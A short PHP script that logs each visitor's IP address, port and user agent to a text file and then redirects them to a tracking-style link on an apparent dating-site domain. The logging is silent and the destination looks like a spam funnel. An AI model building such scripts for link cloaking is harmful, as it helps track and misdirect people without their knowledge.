<?php
$ipAddress = $_SERVER['REMOTE_ADDR'];
$remotePort = $_SERVER['REMOTE_PORT'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Log or save the data
file_put_contents('log.txt', "$ipAddress:$remotePort - $userAgent\n", FILE_APPEND);

// Redirect to the target URL
header('Location: https://cgedhib.newdatesclub.com/s/99470c40f2ff7');
exit();
?>